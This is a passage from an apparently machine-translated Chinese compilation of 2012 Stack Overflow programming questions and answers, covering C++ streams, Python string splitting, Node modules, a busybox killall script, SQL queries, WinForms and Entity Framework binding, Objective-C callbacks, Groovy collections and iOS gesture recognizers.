如果`ostream`s 自动为每个`<<`输出插入分隔符，那么某人编写*没有*分隔符的文本会困难得多。他们必须手动将这些字符串和/或值连接成一个字符串，然后输出。

他们将使用什么来连接？它们不能`ostringstream`像您通常那样使用，因为它使用与`ofstream`. 所以每个`<<`人都会在流中放置一个分隔符。

简而言之，IO 流 API 写的是您*告诉它*写的内容，而不是您可能“想要”或不想写的内容。它不是序列化 API；C++ 不是 C# 或 Java。如果您想要严肃的序列化功能，请使用[Boost.Serialization](http://www.boost.org/libs/serialization/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:44:55.070

很多时候你想用`ostream`(commonly `stringstream`) 连接字符串。如果您特别不希望将它们连接起来，那么很容易做到：

`os << _name.first_name << '\n' << _name.last_name;`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T21:20:54.713

`ifstream`并且`ofstream`基本上是流，因此它们没有任何迹象表明其中的数据限制。将它们想象成一条河流，所有数据都可以读取或写入它们。这是文件的真实性质，因此如果您需要它们进行序列化，则必须实现序列化机制或使用为此目的设计的库，例如`boost::serialization`. 在 C++ 中，每件事都按原样实现，因此您可以获得最大的性能！:)

# python - python拆分一个至少有2个空格的字符串

> ID：12866631
> 
> 赞同：43
> 
> 时间：2012-10-12T20:28:59.020
> 
> 标签：python, split, python-2.7

我想只在至少有两个或更多空格的地方拆分一个字符串。

例如

```
str = '10DEUTSCH        GGS Neue Heide 25-27     Wahn-Heide   -1      -1'
print str.split() 
```

结果：

```
['10DEUTSCH', 'GGS', 'Neue', 'Heide', '25-27', 'Wahn-Heide', '-1', '-1'] 
```

我希望它看起来像这样：

```
['10DEUTSCH', 'GGS Neue Heide 25-27', 'Wahn-Heide', '-1', '-1'] 
```

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2012-10-12T20:30:20.823

```
In [4]: import re    
In [5]: text = '10DEUTSCH        GGS Neue Heide 25-27     Wahn-Heide   -1      -1'
In [7]: re.split(r'\s{2,}', text)
Out[7]: ['10DEUTSCH', 'GGS Neue Heide 25-27', 'Wahn-Heide', '-1', '-1'] 
```

## 更新 2021+ 答案。

### `str.split`现在接受正则表达式进行拆分。

在这里阅读[更多](https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.Series.str.split.html)

```
row = '10DEUTSCH        GGS Neue Heide 25-27     Wahn-Heide   -1      -1'
df = pd.DataFrame({'string' : row},index=[0]) 
```

* * *

```
print(df)
                                              string
0  10DEUTSCH        GGS Neue Heide 25-27     Wahn... 
```

* * *

```
df1 = df['string'].str.split('\s{2,}',expand=True)
print(df1)

           0                     1           2   3   4
0  10DEUTSCH  GGS Neue Heide 25-27  Wahn-Heide  -1  -1 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-10-12T20:33:41.837

正如已经指出的那样，`str`这不是您的字符串的好名称，因此请`words`改用：

```
output = [s.strip() for s in words.split('  ') if s] 
```

.split(' ') - 带有两个空格 - 将为您提供一个列表，其中包含空字符串和带有尾随/前导空格的项目。列表推导遍历该列表，保留所有非空白项 ( `if s`)，并且 .strip() 处理任何前导/尾随空格。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-10-12T20:33:43.377

```
In [30]: strs='10DEUTSCH        GGS Neue Heide 25-27     Wahn-Heide   -1      -1'

In [38]: filter(None, strs.split("  "))

Out[38]: ['10DEUTSCH', 'GGS Neue Heide 25-27', ' Wahn-Heide', ' -1', '-1']

In [32]: map(str.strip, filter(None, strs.split("  ")))

Out[32]: ['10DEUTSCH', 'GGS Neue Heide 25-27', 'Wahn-Heide', '-1', '-1'] 
```

对于 python 3，将结果`filter`和`map`with包装起来`list`以强制迭代。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-04-05T23:03:06.133

如果是：

*   混合制表符和空格
*   字符串开头和/或结尾处的空格

（最初回答[Split string at whitespace 比单个空格和制表符长， Python](https://stackoverflow.com/questions/61050576/split-string-at-whitespace-longer-than-a-single-space-and-tab-characters-python)）

我会用正则表达式拆分：2个或更多空格，然后过滤掉`re.split`产生的空字符串：

```
import re

s = '        1\. 1\. 2\.     1 \tNote#EvE\t \t1\t \tE3\t \t  64\t        1\. 3\. 2\. 120 \n'

result = [x for x in re.split("\s{2,}",s) if x]

print(result) 
```

印刷：

```
['1\. 1\. 2.', '1', 'Note#EvE', '1', 'E3', '64', '1\. 3\. 2\. 120'] 
```

这不会保留前导/尾随空格，但它很接近。

# javascript - NodeJS 导出模块

> ID：12866633
> 
> 赞同：1
> 
> 时间：2012-10-12T20:29:07.767
> 
> 标签：javascript, node.js, module

浏览 NPM 存储库中的现有模块，我看到了使用以下模块的模块：

```
 module.exports = (function(){
        return {
            // objects from the module
        };
    })(); 
```

以及使用的模块

```
 module.exports = { //objects }; 
```

它们有什么性能差异吗？Node 中的模块组织是否有第三个选项/模式？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T22:02:49.757

使用匿名函数的第一种方法用于避免潜在的名称冲突。这是这样做的唯一原因。认真对待这个因素的两种方法之间不会有明显的性能差异。

# embedded-linux - 为什么 killall 不能从脚本中工作？

> ID：12866651
> 
> 赞同：1
> 
> 时间：2012-10-12T20:30:29.400
> 
> 标签：embedded-linux, busybox

我有一个启动两个程序（cxLog 和 cx）的脚本（runcx）。我希望能够杀死整个混乱，所以我创建了一个脚本：

```
50:/root # cat stop
killall runcx
killall cx
killall cxLog 
```

但它不起作用：

```
50:/root # ./stop
: no process killed
: no process killed
: no process killed 
```

而单个命令会：

```
50:/root # killall runcx
50:/root # killall cx
killall: Could not kill pid '256': No such process
50:/root # 
```

（cx 正在使用线程，并且 pid '256' 在其父进程被杀死时显然消失了）

这里发生了什么？我怎样才能在不输入所有内容的情况下杀死我的程序？环境是 Linux 内核 2.4.26 和一个相当旧的busybox 版本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:30:29.400

我在输入以上所有内容但在点击发布按钮之前发现了这一点。我使用 vim 在 PC 上创建了脚本“stop”，默认文件格式是 dos。因此，killall 试图杀死名为“runcx^M”、“cx^M”和“cxLog^M”的程序。我删除了 ^Ms，脚本运行得更好了！

# php - SQL 查询不返回特定结果

> ID：12866655
> 
> 赞同：0
> 
> 时间：2012-10-12T20:30:47.347
> 
> 标签：php, mysql, sql, select

我正在尝试创建查询以不包括 part_id = '1' 的汽车。这可行，但汽车继续出现，因为 car_id 与多个其他 part_id 相关联。

这是我的查询：

```
SELECT
    distinct car.car_id, 
             part.description
FROM car
JOIN car_parts part on (car.car_id = part.car_id)
WHERE part.part_id <> '1' 
```

我的桌子：car_parts

```
Car ID | Part ID
   1        1
   1        3
   1        4
   2        2
   2        5
   2        7
   3        1
   3        4
   3        9
   4        1 
```

应该从查询返回的唯一 car_id 是 car_id = 2。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:34:38.657

```
SELECT distinct car.car_id, part.description
FROM car
JOIN car_parts part on (car.car_id = part.car_id)
WHERE part.part_id <> '1'
AND car.car_id not in ( select car_id from part where part = 1 ) 
```

# c# - 将 TextBox 绑定到 BindingSource IList 属性中的特定 DataRowView

> ID：12866658
> 
> 赞同：0
> 
> 时间：2012-10-12T20:31:07.193
> 
> 标签：c#, winforms, binding, dataset, datarowview

在我的应用程序中，我有一个表格，其中包含组织内各个区域的数据，相关表格包含有关每个区域的统计数据。为简单起见，我将它们表示为：

```
____________          ________________          ________________
|Region    |          |RegionHasDemo |          |DemoCategories|
|          |1        *|              |*        1|              |
|-RegionID |----------|-RegionID     |----------|-CatID        |
|-City     |          |-CatID        |          |-SortOrder    |
|-Zip      |          |-Population   |          |-Archive      |
|-State    |          |______________|          |______________|
|__________| 
```

DemoCategories 表包含人口统计类型。例如，假设 RegionHasDemo 代表我所在地区的年龄人口。DemoCategories 中的 CatID 将是 Age20to30、Age20to40 等值，因此 RegionHasDemo 代表所有地区的年龄组人口。

在我的应用程序中，我想创建一个表单来添加区域数据以及所有相关数据。为此，我创建了两个绑定源，一个用于 RegionData，一个用于 RegionHasDemo，其中包含 RegionData 作为 DataSource。由于各种原因，我想通过将单个文本框绑定到 RegionHasDemoBindingSource 的 List 属性中包含的 DataRowViews 来输入 RegionHasDemo 的数据。注意，我不想使用网格视图。

这是每次 RegionData 的 Current 属性更改时我用来绑定到文本框的代码：

注意：表名与我的示例不同，RegionData = UNITS; RegionHasDemo = UnitExp; DemoCategories = CatExp。

```

`using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.OleDb;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;

namespace DBsample
{
        public partial class Form1 : Form
    {
        private DataTable DataSource;
        private string relatedTableName;

        /// <summary>
        /// Holsd the values needed to define my text box rows and 
        /// relate them to the table containing their human readable
        /// names, sort order, and active record status.
        /// </summary>
        private struct textBoxRow
        {
            public string Key { get; set; }
            public TextBox TBox { get; set; }
            public Label NameLabel { get; set; }
            public string Name { get; set; }
            public int Value { get; set; }
        }
        textBoxRow[] rows;

        public Form1()
        {
            InitializeComponent();

            DataSource = injuryDB.UnitExp;
            relatedTableName = "CatExpUnitExp";

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.uNITSTableAdapter.Fill(this.injuryDB.UNITS);
            this.catExpTableAdapter1.Fill(this.injuryDB.CatExp);
            this.unitExpTableAdapter1.Fill(this.injuryDB.UnitExp);
            // Fill data table
            // Associate them in the struct in sorted order 

            // Get a list of categories
            DataTable catTable = DataSource.ParentRelations[relatedTableName].ParentTable;

            // Sort them while leaving out the ones we don't want
            List<DataRow> tbr = (from r in catTable.AsEnumerable()
                                    where r.Field<bool>("ActiveRecord")
                                    orderby r.Field<int>("SortOrder")
                                    select r).ToList();

            // The rows we are going to show
            rows = new textBoxRow[tbr.Count];
            tableLayoutPanel1.RowStyles.Clear();
            int rowIndex = 0;

            // Create rows and add them to the form
            foreach (DataRow r in tbr)
            {
                textBoxRow tRow = new textBoxRow();

                Label lbl = new Label();
                lbl.Text = r.Field<string>("CatName");

                TextBox tb = new TextBox();

                tRow.Key = r.Field<string>("Category");
                tRow.Name = r.Field<string>("CatName");
                tRow.TBox = tb;
                tRow.NameLabel = lbl;

                tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.AutoSize));
                tableLayoutPanel1.Controls.Add(tRow.NameLabel, 0, rowIndex);
                tableLayoutPanel1.Controls.Add(tRow.TBox, 1, rowIndex);

                rows[rowIndex] = tRow;
                rowIndex++;
            }

            // Refresh the bindings in the text boxes when the current item changes
            unitCatExpBindingSource.CurrentItemChanged += currentItemChanged;
            currentItemChanged(null, null);
        }

        private void uNITSBindingNavigatorSaveItem_Click(object sender, EventArgs e)
        {
            bool validated = this.Validate();
            if(validated == true)
                Debug.WriteLine("Validated data to be saved");
            else
                Debug.WriteLine("Did not validate data to be saved");
            this.uNITSBindingSource.EndEdit();
            int recordsUpdated = this.tableAdapterManager.UpdateAll(this.injuryDB);
            Debug.WriteLine(string.Format("{0} records were changed", recordsUpdated));

        }
        private void currentItemChanged(object sender, EventArgs e)
        {
            if (rows == null) return;

            // For some reason I have to pass this into the bindingSource's find method instead of a 
            // straight string of the column name. It has something to do with the fact that we are 
            // binding to a data relation instead of a DataTable i think. Wadded through so many forums for this...
            PropertyDescriptor pdc = unitCatExpBindingSource.CurrencyManager.GetItemProperties()["Cat"];

            // Rebind each text box row
            foreach (textBoxRow tBoxRow in rows)
            {

                tBoxRow.TBox.DataBindings.Clear();

                // If the record doesn't exist then that means the population for that group is zero
                tBoxRow.TBox.Text = "0";

                //tbr.TBox.Leave -= existingRecordTBoxChanged;
                //tbr.TBox.Leave -= nonExistingRecordTBoxChanged;
                // Get the index of the source I want to bind to using the text
                int bindingIndex = unitCatExpBindingSource.Find(pdc, tBoxRow.Key);
                //object bs = unitCatExpBindingSource[bindingIndex];
                if (bindingIndex >= 0)
                {
                    Binding b = tBoxRow.TBox.DataBindings.Add("Text", unitCatExpBindingSource[bindingIndex], "Jumps", true);

                }
                else
                {
                    // TODO: Create an event that adds a new to the demo table if number not 0
                }

            }
        }

        // TODO: for this to work the delete options of the relationships
        // for Units -> category tables need to be set to cascade
        private void existingRecordTBoxChanged(object sender, EventArgs e)
        {
            TextBox tBox = (TextBox)sender;
            if (tBox.Text == "" || tBox.Text == "0")
            {
                //DataRow d = (DataRow)tBox.DataBindings[0].DataSource;
            }
        }
        private void nonExistingRecordTBoxChanged(object sender, EventArgs e)
        {
            TextBox tBox = (TextBox)sender;
            if (!(tBox.Text == "" || tBox.Text == "0"))
            {
                // TODO: Add record to the database
            }
        }
}
<code>` 

我的问题是，尽管当我的绑定似乎可以正常查看时，即当我浏览单元时文本框会发生变化。更改不会保存到数据库中。我在文本框中所做的更改将保留在 DataSet 中（当我离开记录并返回时它们保持不变）但是当我保存 dataSet 时关闭表单并再次打开它，更改就消失了。就好像没有通知数据集这些值已更改。此外，如果我将相关数据放在自定义文本框列表旁边的数据网格中，我可以从 DataGridView 修改数据，并且可以保存数据。此外，当我更改 TextBoxes 中的数据时，新值将显示在 DataGridView 中，但仍不会保存...

我想知道我用来将文本框绑定到数据的方法是否正确。意思是，我可以以包含在 Binding 源中的 DataRowView 的形式绑定数据，并期望它的行为与我直接使用绑定源的行为相同吗？

非常感谢您的帮助。我希望我已经提供了足够的信息让你继续。请记住，此代码示例来自原型。我知道这不是最佳做法。也就是说，我将不胜感激任何建设性的批评。

            回答 #1

赞同：1

时间：2012-10-22T18:40:21.067

经过多次试验和错误，我发现了问题。问题是我将文本框绑定到 DataRowView 对象。我不确定，但我认为 DataRowView 只能在 GridView 或 ListView 组件中专门使用。在我的项目中，我想将每个 DataRowView 单独绑定到单独的文本框，这会导致问题，因为 DataRowViews 似乎共享某种绑定属性，因此只有一个文本框被正确绑定。解决方案是从 DataRowView 中提取 DataRow 对象并将文本框绑定到该对象。如果有人对数据绑定上下文中 DataRows 和 DataRowViews 之间的差异有任何意见，将不胜感激。

            回答 #2

赞同：0

时间：2012-10-16T09:16:23.960

我在组合框中有同样的问题，我已经解决了。我的代码看起来像

```
<sdk:DataGridTemplateColumn Width="150" Header="EstimateIOName">
                <sdk:DataGridTemplateColumn.CellEditingTemplate>
                    <DataTemplate>
                        <ComboBox x:Name="cbo" ItemsSource="{StaticResource IOList}" SelectedValue="{Binding Path=EstimateIOName,Mode=TwoWay}" SelectedValuePath="EstimateIOName"  SelectionChanged="cbo_SelectionChanged" DropDownClosed="cbo_DropDownClosed" ></ComboBox>
                    </DataTemplate>
                </sdk:DataGridTemplateColumn.CellEditingTemplate>
            </sdk:DataGridTemplateColumn>

            <sdk:DataGridTemplateColumn Width="180" Header="Selected EstimatedIOName" IsReadOnly="True">
                <sdk ataGridTemplateColumn.CellEditingTemplate>
                    <DataTemplate>
                        <TextBlock x:Name="cbo1" Text="{Binding Path=EstimateIOName,Mode=TwoWay}"></TextBlock>
                    </DataTemplate>
                </sdk:DataGridTemplateColumn> 
```

我的代码背后看起来像

```
LoadOperation<ATDueDate> Load1 = context1.Load<ATDueDate>(context1.GetATDueDatesByEntityQuery("I"));
        Load1.Completed += (s, ea) =>
        {
            this.DataContext = Load1.Entities;
            comboBox2.ItemsSource = Load1.Entities.Select(a => a.PackageName.Substring(1,2)).Distinct();
        }; 
```

按钮点击

```
private void button1_Click(object sender, RoutedEventArgs e)
    {

        context1.SubmitChanges();

        MessageBox.Show("Changes Saved");
    } 
```

```

# c# - 对具有多对多关系的子组合框进行数据绑定

> ID：12866661
> 
> 赞同：0
> 
> 时间：2012-10-12T20:31:30.260
> 
> 标签：c#, winforms, entity-framework, c#-4.0, data-binding

下午好，

我正在尝试实现实体框架，但在尝试利用主从关系时似乎遇到了问题。理想情况下，我希望能够从组合框中选择一家公司，然后用所选公司的员工姓名列表填充后续组合框。我似乎遇到了一些问题，试图通过多对多关系实现这一点，该关系有一个包含一些附加数据的桥接表。以下是我正在使用的三个数据库表的简化版本：

```
create table Organization.Company
(
   CompanyID int not null,
   CompanyName varchar(40) not null,
   ServiceRepresentative varchar(20) not null,
   primary key (CompanyID)
)

create table Person.Employment
(
   CompanyID int not null,
   PersonID uniqueidentifier not null,
   EmployeeID int not null,
   FullTime bit not null,
   HoursPerWeek float null,
   primary key (CompanyID, PersonID),
   constraint fk_Company_Employment foreign key (CompanyID) references Organization.Company(CompanyID),
   constraint fk_Person_Employment foreign key (PersonID) references Person.ContactInfo(PersonID)
)

create table Person.ContactInfo
(
   PersonID uniqueidentifier not null,
   FirstName varchar(40) not null,
   LastName varchar(40) not null,
   primary key (PersonID)
) 
```

我的代码隐藏我有以下（WinForms）：

```
 private orgEntities db;
    private BindingSource companyBinding;
    private BindingSource employeeBinding;

    public MainForm()
    {
        InitializeComponent();

        this.db = new orgEntities();
        this.companyBinding = new BindingSource();
        this.employeeBinding = new BindingSource();

        this.companyBinding.DataSource = db.Companies.OrderBy(x => x.CompanyName);

        this.employeeBinding.DataSource = companyBinding;
        this.employeeBinding.DataMember = "Employment";

        this.currentCompanyComboBox.DataSource = companyBinding;
        this.currentCompanyComboBox.DisplayMember = "CompanyName";
        this.currentCompanyComboBox.ValueMember = "CompanyID";

        this.currentEmployeeComboBox.DataSource = employeeBinding;
        this.currentEmployeeComboBox.DisplayMember = "ContactInfo.FullName";  // Generated by extension class
        this.currentEmployeeComboBox.ValueMember = "PersonID";           
    } 
```

The issue I seem to be running into is that only one employee is displayed inside the combobox when a company is selected. 当我将“ContactInfo.FullName”更改为“EmployeeID”时，我得到了 EmployeeID 的完整列表。我假设实体框架正在抓取第一个人并导航到他们的 FullName 属性，这导致他们的信息是唯一显示的内容。

有没有什么办法可以让我在这个下拉列表中显示完整的姓名列表，同时存在桥接表（Person.Employment），或者我最好创建一个将就业和联系信息表组合在一起的视图并使用它在 edmx 文件而不是两个单独的表中？

我知道我可能会以错误的方式解决这个问题，如果有人能指出我在这方面的正确方向，我将不胜感激。谢谢你，祝你有美好的一天！

# objective-c - 在 Objective C 中传入一个方法

> ID：12866662
> 
> 赞同：0
> 
> 时间：2012-10-12T20:31:38.283
> 
> 标签：objective-c, delegates

在 C# 中，您可以创建委托方法，将其分配给变量或将其传递给方法，就好像它是变量一样。例如：

```
public delegate int Lookup(String s);
//...
public static int Evaluate(String exp, Lookup variableEvaluator)
{
//...
} 
```

我听说在 C 中你可以创建一个指向任何方法的指针，然后将该指针传递给一个方法。谁能给我一个在Objective-C中这样做的简单例子？当然，我可以使用单个方法创建一个对象并将该对象传递给一个方法。但我很好奇是否有一种类似于 C# 或 C 的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:42:38.183

很多方法。

**一：好的。**使用块（闭包，lambda演算，不管你怎么称呼它）：

```
typedef void (^MyCallback)();

- (void)callTheCallback:(MyCallback)blockToInvoke
{
    blockToInvoke();
}

MyCallback cb = ^{
    NSLog(@"I was called! :D");
};
[self callTheCallback:cb]; 
```

**二：坏。**获取指向方法函数本身的指针并调用它。（警告：如果你使用这种方法，我会起诉你。）

```
- (void)callTheCallback:(IMP)funcPtrToCall withObject:(id)obj selector:(SEL)sel
{
     funcPtrToCall(obj, sel);
}

- (void)someCallbackMethod
{
    NSLog(@"I was called! :D");
}

IMP implemt = [[self class] instanceMethodForSelector:@selector(someCallbackMethod)];
[self callTheCallback:implemt withObject:self selector:@selector(someCallbackMethod)]; 
```

**三：丑。**使用委托：

```
- (void)delegateMethodOfSomeObject:(SomeObject *)obj
{
    NSLog(@"I was called! :D");
}

SomeObject *obj = [[SomeObject alloc] init];
obj.delegate = self;
[obj makeThisObjectSomehowCallItsDelegateThatIsCurrentlySelf]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:39:09.023

两个快速的想法浮现在脑海。

简短的答案称为“块”，但它可能低于您所需要的推荐级别。

“更清洁”的解决方案（阅读：更高级别）是传递两个参数：对象（称为“目标”）和选择器（称为“动作”）。这是 Objective-C 中非常常见的模式，所以我只演示这个模式。如果您对积木的想法感兴趣，[请查看此文档](http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/Blocks/Articles/00_Introduction.html)。

本质上，对象应该作为 id 传递，选择器作为 SEL 传递，为此我们有方便的 @selector() 构造：

```
-(void) doThingWithTarget:(id) targetObj action:(SEL) actionSel {
  if([targetObj respondsToSelector:actionSel]) {
    [targetObj performSelector:actionSel withObject:self];
  }
}

// ...
[thatOtherObject doThingWithTarget:self action:@selector(myMethod:)];

// ... where

-(void) myMethod:(id) sender {
  // sender is the calling object, or should be by contract.
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:37:52.683

Objective C 使用选择器。[http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/objectivec/Chapters/ocSelectors.html](http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/objectivec/Chapters/ocSelectors.html)

# groovy - 如何在 groovy 中编写条件集合？

> ID：12866664
> 
> 赞同：67
> 
> 时间：2012-10-12T20:31:40.603
> 
> 标签：groovy

想象一下我有这样的结构：

```
class Foo {
   String bar
} 
```

现在想象我有几个实例，`Foo`其`bar`值为`baz_1`,`baz_2`和`zab_3`。

我想写一个只收集`bar`包含文本的值的收集语句`baz`。我无法让它工作，但它看起来像这样：

```
def barsOfAllFoos = Foo.getAll().bar
assert barsOfAllFoos == [ 'baz_1', 'baz_2', 'zab_3' ]
def barsWithBaz = barsOfAllFoos.collect{ if( it.contains( "baz" ) { it } ) } // What is the correct syntax for this?
assert barsWithBaz == [ 'baz_1', 'baz_2' ] 
```

* * *

## 回答 #1

> 赞同：100
> 
> 时间：2012-10-12T20:40:09.740

你需要[`findAll`](http://docs.groovy-lang.org/latest/html/groovy-jdk/java/util/Collection.html#findAll(groovy.lang.Closure))：

```
barsOfAllFoos.findAll { it.contains 'baz' } 
```

* * *

## 回答 #2

> 赞同：52
> 
> 时间：2012-10-12T23:21:31.413

如果你想同时过滤和转换，有很多方法可以做到这一点。在 1.8.1 之后，我会选择`#findResults`一个闭包，它为我想要跳过的元素返回 null。

```
def frob(final it) { "frobbed $it" }

final barsWithBaz = barsOfAllFoos.findResults {
    it.contains('baz')? frob(it) : null
} 
```

在早期版本中，您可以使用`#findAll`和`#collect`

```
final barsWithBaz = barsOfAllFoos
                  . findAll { it.contains('baz') }
                  . collect { frob(it) } 
```

或者`#sum`

```
final barsWithBaz = barsOfAllFoos.sum([]) {
    it.contains('baz')? [frob(it)] : []
} 
```

或者`#inject`

```
final barsWithBaz = barsOfAllFoos.inject([]) {
    l, it -> it.contains('baz')? l << frob(it) : l
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-05-27T15:01:25.310

使用`findResults`对我不起作用...如果您想收集与条件匹配的值的转换版本（例如多行的正则表达式搜索），您可以使用`collect`后跟`find`或`findAll`如下。

```
def html = """
    <p>this is some example data</p>
    <script type='text/javascript'>
        form.action = 'http://www.example.com/'
        // ...
    </script>
"""

println("Getting url from html...")
// Extract the url needed to upload the form
def url = html.split("\n").collect{line->
    def m = line =~/.*form\.action = '(.+)'.*/
    if (m.matches()) {
        println "Match found!"
        return m[0][1]
    }
}.find()

println "url = '${url}'" 
```

这将返回与给定模式匹配的行部分。

```
Getting url from html...
Match found!
url = 'http://www.example.com/' 
```

# iphone - 整个视图中的 UIGestureRecognizer

> ID：12866672
> 
> 赞同：6
> 
> 时间：2012-10-12T20:32:30.123
> 
> 标签：iphone, objective-c, ios

我希望能够制作一个手势识别器来监听屏幕上任何地方的两指滑动。

现在我在一个滚动的子视图中有一个 UITableView，当然，它似乎没有选择我在视图上设置的 UIGestureRecognizer。当您使用两个手指时，它只是滚动...

有没有办法让整个视图，也许是超级视图，听两根手指触摸，当它识别到它时，它不会滚动表格视图，而是做我想要它做的事情？

**编辑**：这是我的代码，但这应该是一个非常普遍的问题。我只是希望能够在整个视图中使用 UIGestureRecognizers。

```
navBarTitle.title = @"Crunch";

//opening the menuView from launch

//setup the customtable view as a subview in menuView
SDMenuViewController *mvc = [[[SDMenuViewController alloc] initWithNibName:@"SDNestedTableView" bundle:nil] autorelease];
[self addChildViewController:mvc];
[mvc didMoveToParentViewController:self];
[menuView addSubview:mvc.view];

[mvc.view setFrame:CGRectMake(mvc.view.frame.origin.x, mvc.view.frame.origin.y, mvc.view.frame.size.width, mvc.view.frame.size.height + 44)]; //add navBarHeight, for some strage reason

//add swipe down gesture on for the menu

UISwipeGestureRecognizer *swipeClose =[[[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(closeMenu)] autorelease];
 swipeClose.numberOfTouchesRequired = 2;
 swipeClose.direction = UISwipeGestureRecognizerDirectionUp;

 UISwipeGestureRecognizer *swipeOpen = [[[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(openMenu)] autorelease];
 swipeOpen.numberOfTouchesRequired = 2;
 swipeOpen.direction = UISwipeGestureRecognizerDirectionDown;

for (UIGestureRecognizer* rec in menuView.gestureRecognizers) {
    [rec requireGestureRecognizerToFail:swipeClose];
    [rec requireGestureRecognizerToFail:swipeOpen];
}

for (UIGestureRecognizer* rec in mvc.view.gestureRecognizers) {
    [rec requireGestureRecognizerToFail:swipeClose];
    [rec requireGestureRecognizerToFail:swipeOpen];
}

[mvc.view addGestureRecognizer:swipeClose];
[mvc.view addGestureRecognizer:swipeOpen];

[self.view addGestureRecognizer:swipeClose];
[self.view addGestureRecognizer:swipeOpen]; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-17T00:20:17.183

也许我没有清楚地解释我的问题。但是对于我所做的事情，这最终奏效了，也许它会在未来帮助其他人：

[iPad 应用程序的 UIScrollview 中的两指轻扫](https://stackoverflow.com/questions/8711395/two-finger-swipe-in-uiscrollview-for-ipad-application)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:56:26.817

你可以尝试做这样的事情：

```
UISwipeGestureRecognizer* p = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(actionPan:)];
p.numberOfTouchesRequired = 2;

for (UIGestureRecognizer* rec in tableView.gestureRecognizers) {
    [rec requireGestureRecognizerToFail:p];
}

[self.view addGestureRecognizer:p]; 
```

希望这会有所帮助

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-17T13:31:08.880

```
//In view did load        
    [self.view setMultipleTouchEnabled:YES];

- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{

    if ([[event touchesForView:self.view] count] > 1) {
        NSLog(@"%d active touches",[[event touchesForView:self.view] count]) ;
 UISwipeGestureRecognizer *swipeGesture = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(handleSwipeGesture:)];
            swipeGesture.direction = UISwipeGestureRecognizerDirectionUp;
            [self.view addGestureRecognizer:swipeGesture];
  }

}

    -(void)handleSwipeGesture:(UISwipeGestureRecognizer *) sender 
    {
        //Gesture detect - swipe up/down , can be recognized direction
        if(sender.direction == UISwipeGestureRecognizerDirectionUp)
        {
            // do some thing...
        }
    } 
```

我希望这能解决你的问题。并启用触摸使计数等于 2 或任意数量的触摸.. :) 如果您有任何疑问，请随时询问

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-15T13:54:38.073

  在 self.view 上添加另一个带有 self.view 框架的视图，例如“viewForGesture”，并在该视图上添加手势识别器，例如

```
 UIView *viewForGesture = [[ [UIView alloc]initWithFrame:self.view.frame] autorelease];
       [viewForGesture setBackgroundColor:[UIColor clearColor]];
       [self.view addSubview:viewForGesture];
        .
        .
        .
       [viewForGesture addGestureRecognizer:swipeOpen];
       [viewForGesture addGestureRecognizer:swipeClose]; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-15T13:17:55.223

有两种`UIView`检测方法`touch`。您定义并想要的方法是*Ezeki*`UIGestureRecognizer`已经给出的答案。您可以用来检测的另一种方法是覆盖委托。*`touch``UITouch`*

 *```
- (void) touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event 
{
    UITouch *touch = [touches anyObject];

    if(touch.tapCount==2)
    {
        //Do something ... (Here, you can also check for the object which touched.)
    }
} 
```*

# mysql - mysql 列计数与值计数不匹配（redux）：是的。或者是吗？

> ID：12866675
> 
> 赞同：0
> 
> 时间：2012-10-12T20:32:38.310
> 
> 标签：mysql

MySQL 是否因为插入语句中的嵌套 SELECT 使用 COUNT(*) 函数而不是选择实际列而让我感到悲伤？那么，解决方法是什么？

这是故事：

```
mysql> explain test;
+----------+----------------------+------+-----+---------+-------+
| Field    | Type                 | Null | Key | Default | Extra |
+----------+----------------------+------+-----+---------+-------+
| language | varchar(50)          | YES  |     | NULL    |       |
| count    | smallint(5) unsigned | YES  |     | NULL    |       |
+----------+----------------------+------+-----+---------+-------+
2 rows in set (0.00 sec)

mysql> SELECT languages.name, COUNT(*) AS `total` FROM languages JOIN events ON languages.id     = events.language_id GROUP BY name HAVING total > 250 ORDER BY total DESC;
+-----------+-------+
| name      | total |
+-----------+-------+
| Spanish   | 60079 |
| Foochow   |  2838 |
| Mandarin  |  2396 |
| Russian   |  1675 |
| Arabic    |  1410 |
| Cantonese |  1358 |
| Korean    |   736 |
| French    |   531 |
| Punjabi   |   426 |
| Urdu      |   408 |
| Hebrew    |   276 |
| Pashto    |   255 |
+-----------+-------+
12 rows in set (0.00 sec)

mysql> INSERT INTO test (`language`,`count`) VALUES ((SELECT languages.`name`, COUNT(*) AS `total` FROM languages JOIN events ON languages.id = events.language_id GROUP BY name HAVING total > 250 ORDER BY total DESC));
ERROR 1136 (21S01): Column count doesn't match value count at row 1 
```

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:40:43.220

